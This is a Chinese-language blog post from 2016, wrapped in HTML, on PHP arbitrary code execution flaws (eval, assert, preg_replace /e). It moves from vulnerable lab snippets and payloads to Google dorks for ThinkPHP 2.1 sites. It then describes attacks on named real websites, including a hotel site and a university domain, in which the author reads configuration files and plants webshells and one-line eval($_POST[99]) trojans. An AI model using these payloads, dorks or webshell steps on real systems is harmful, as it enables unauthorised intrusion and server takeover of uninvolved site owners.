@@ -1,0 +1,168 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>任意代码执行漏洞 | liuqi</title>
+  <meta name="author" content="liuqi">
+  
+  <meta name="description" content="吃吃睡睡终其一生">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="任意代码执行漏洞"/>
+  <meta property="og:site_name" content="liuqi"/>
+
+  
+    <meta property="og:image" content="undefined"/>
+  
+
+  <link href="/favicon.png" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="liuqi" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+
+</head>
+
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">liuqi</a></h1>
+  <h2><a href="/"></a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">Home</a></li>
+    
+      <li><a href="/archives">Archives</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div>
+</header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2016-07-30T12:20:08.000Z"><a href="/2016/07/30/任意代码执行漏洞/">2016-07-30</a></time>
+      
+      
+  
+    <h1 class="title">任意代码执行漏洞</h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p><strong>漏洞原理</strong><br>：<br>当应用调用一些能将字符串转换为代码的函数时，没有考虑安全性，用户是否可以控制这个字符，造成代码注入漏洞，如php中的eval函数，可以将字符串代表的代码作为php代码执行<br><strong>相关函数</strong><br>：<br>php:eval assert<br>python:exec<br>phpcms中的string2array函数<br>array(  //这个是字符串形式的数组，它并不是数组，而是字符串<br>    ‘upload_maxsize’ =&gt; ‘2048’,<br>    ‘upload_allowext’ =&gt; ‘jpg|jpeg|gif|bmp|png|doc|docx|xls|xlsx|ppt|pptx|pdf|txt|rar|zip|swf’,<br>    ‘watermark_enable’ =&gt; ‘1’,<br>    ‘watermark_minwidth’ =&gt; ‘300’,<br>    ‘watermark_minheight’ =&gt; ‘300’,<br>    ‘watermark_img’ =&gt; ‘/statics/images/water/mark.png’,<br>    ‘watermark_pct’ =&gt; ‘85’,<br>    ‘watermark_quality’ =&gt; ‘80’,<br>    ‘watermark_pos’ =&gt; ‘9’,<br>)<br>function string2array($data) {<br>    //这个函数可以将字符串$data转化为数组<br>    if($data == ‘’)<br>        return array();<br>    @eval(“\$array = $data;”);<br>        return $array;<br>}<br><strong>漏洞危害</strong><br>：<br>执行代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">让网站写shell</div><div class="line">甚至控制服务器</div></pre></td></tr></table></figure></p>
+<p><strong>漏洞分类</strong><br>：<br>执行代码的函数：eval.assert<br>callback函数：preg_replace+ /e模式<br>反序列化：unserialize()反序列化函数<br><strong>漏洞挖掘</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">框架找漏洞，如thinkphp:</div><div class="line">inurl:index.php intext:Thinkphp 2.1</div><div class="line">框架的URL格式如下：</div><div class="line"> Site:Port/Module name/Method name/Property name/Preperty value</div><div class="line"> Site:Port/index.php?m=Module_name&amp;f=Method_name&amp;v=Preperty_value</div><div class="line"> </div><div class="line"> www.xx.com:88/News/show/id/328</div><div class="line"> www.yy.com:99/index.php?m=News&amp;f=detail&amp;item=23</div></pre></td></tr></table></figure></p>
+<p> <strong>搭建环境的代码</strong><br>是四个代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$data = $_GET[&apos;data&apos;];</div><div class="line">eval(&quot;\$ret = $data;&quot;);</div><div class="line">echo $ret;</div></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">http://192.168.188.66/code_inject/2/?data=&apos;);phpinfo();//</div><div class="line">&lt;?php</div><div class="line">$data = $_GET[&apos;data&apos;];</div><div class="line">echo &quot;\$ret = &apos;$data&apos;;&quot;;</div><div class="line">eval(&quot;\$ret = strtolower(&apos;$data&apos;);&quot;);</div><div class="line">eval(&quot;\$ret = strtolower(&apos;&apos;);phpinfo();// &apos;);&quot;);</div><div class="line">echo $ret;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$data = $_GET[&apos;data&apos;];</div><div class="line">echo &quot;\$ret = strtolower(\&quot;$data\&quot;);&quot;;</div><div class="line">eval(&quot;\$ret = strtolower(\&quot;$data\&quot;);&quot;);</div><div class="line">echo $ret;</div></pre></td></tr></table></figure>
+<p><a href="http://192.168.188.66/code_inject/3/?data=&quot;);phpinfo();//" target="_blank" rel="external">http://192.168.188.66/code_inject/3/?data=&quot;);phpinfo();//</a><br><a href="http://192.168.188.66/code_inject/3/?data=(&#39;${" target="_blank" rel="external">http://192.168.188.66/code_inject/3/?data=(&#39;${</a> phpinfo()})<br><a href="http://192.168.188.66/code_inject/3/?data=(&#39;${" target="_blank" rel="external">http://192.168.188.66/code_inject/3/?data=(&#39;${</a> @eval($_POST[99])})</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$data = $_GET[&apos;data&apos;];</div><div class="line">echo $data;</div><div class="line">preg_replace(&apos;/&lt;data&gt;(.*)&lt;\/data&gt;/e&apos;, &apos;$ret = &quot;\\1&quot;;&apos;, $data);</div><div class="line">echo $ret;</div><div class="line">http://192.168.188.66/code_inject/4/?data=&lt;data&gt;$&#123; phpinfo()&#125;&lt;/data&gt;</div><div class="line">http://192.168.188.66/code_inject/4/?data=%3Cdata%3E&#123;$&#123;phpinfo()&#125;&#125;%3C/data%3E</div><div class="line">http://192.168.188.66/code_inject/4/?data=&lt;data&gt;&#123;$&#123;phpinfo()&#125;&#125;&lt;/data&gt;</div><div class="line">http://192.168.188.66/code_inject/4/?data=&lt;data&gt;&#123;$&#123; @eval($_POST[99])&#125;&#125;&lt;/data&gt;</div></pre></td></tr></table></figure>
+<p><a href="http://www.shichidachina.com/News/detail/item/$%7B%20exit(phpinfo())%7D" target="_blank" rel="external">http://www.shichidachina.com/News/detail/item/$%7B%20exit(phpinfo())%7D</a><br>exit（）不显示多余的信息<br><a href="http://www.shichidachina.com/News/detail/item/$%7B%20phpinfo()%7D" target="_blank" rel="external">http://www.shichidachina.com/News/detail/item/$%7B%20phpinfo()%7D</a><br><strong>google搜索</strong><br>：intext:thinkphp intext:”Fast &amp; Simple OOP PHP Framework” intext:”2.1”<br>首先代码执行漏洞查找到一个站之后，点开站的根路径然后点可能跳转的目录，找到参数，在参数后面写上执行的测试代码</p>
+<p>($phpinfo())<br>index.php?m=module_name&amp;a=action_name&amp;id=1<br>/?m=module_name&amp;a=action_name&amp;id=1<br>/module_name&amp;a=action_name/id/1<br>module_name/action_name/id/1/page/2<br>/press/info/id/155<br>模块名/ 方法/参数/参数值<br>/press/info/id /${ phpinfo()}<br>找到两个存在代码执行漏洞的站<br>1.<img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/8/1.png?raw=true" alt="image"></p>
+<p>2.将参数值变成测试代码${phpinfo()<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/8/2.png?raw=true" alt="image"><br>获取当前工作的路径 {$ {print(getcwd())}}<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/8/3.png?raw=true" alt="image"><br>读取文件{$ {exit(var_dump(file_get_contents($_POST[f])))}}<br>f=d:/freehost/tianlonghotel/web/en/Conf/config.php</p>
+<p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/8/4.png?raw=true" alt="image"></p>
+<p>3.写webshell<br><a href="http://www.tianlonghotel.com.cn/index2.php/Index/news/id/{$" target="_blank" rel="external">http://www.tianlonghotel.com.cn/index2.php/Index/news/id/{$</a> {exit(var_dump(file_put_contents($_POST[f],$_POST[d])))}}<br>f=help2.php&amp;d=&lt;? eval($_POST[99])&gt;<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/8/5.png?raw=true" alt="image"></p>
+<p>没有权限换一种方式<br>${ @eval($_POST[99])}后面写上一句话木马<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/8/6.png?raw=true" alt="image"></p>
+<p>第二个网站<br>使用之前的方法找到之后<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/8/7.png?raw=true" alt="image"><br>直接写一句话木马<br><a href="http://bkjxgc.jlau.edu.cn/indxe.php/Notice/show/id/${" target="_blank" rel="external">http://bkjxgc.jlau.edu.cn/indxe.php/Notice/show/id/${</a> @eval($_POST[99])}</p>
+<p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/8/8.png?raw=true" alt="image"></p>
+
+      
+    </div>
+    <footer>
+      
+        
+        
+        
+  <div class="addthis addthis_toolbox addthis_default_style">
+    
+      <a class="addthis_button_facebook_like" fb:like:layout="button_count"></a>
+    
+    
+      <a class="addthis_button_tweet"></a>
+    
+    
+      <a class="addthis_button_google_plusone" g:plusone:size="medium"></a>
+    
+    
+      <a class="addthis_button_pinterest_pinit" pi:pinit:layout="horizontal"></a>
+    
+    <a class="addthis_counter addthis_pill_style"></a>
+  </div>
+  <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js"></script>
+
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+<section id="comment">
+  <h1 class="title">Kommentare</h1>
+
+  
+      <div id="fb-root"></div>
+<script>
+  (function(d, s, id) {
+    var js, fjs = d.getElementsByTagName(s)[0];
+    if (d.getElementById(id)) return;
+    js = d.createElement(s); js.id = id;
+    js.src = "//connect.facebook.net/en_US/all.js#xfbml=1&appId=123456789012345";
+    fjs.parentNode.insertBefore(js, fjs);
+  }(document, 'script', 'facebook-jssdk'));
+</script>
+
+<div class="fb-comments" data-href="http://yoursite.com/2016/07/30/任意代码执行漏洞/index.html" data-num-posts="5" data-width="840" data-colorscheme="light"></div>
+      
+  
+</section>
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  <div class="search">
+  <form action="//google.com/search" method="get" accept-charset="utf-8">
+    <input type="search" name="q" results="0" placeholder="Suche">
+    <input type="hidden" name="q" value="site:yoursite.com">
+  </form>
+</div>
+
+  
+
+  
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  
+  &copy; 2016 liuqi
+  
+</div>
+<div class="clearfix"></div></footer>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+</body>
+</html>
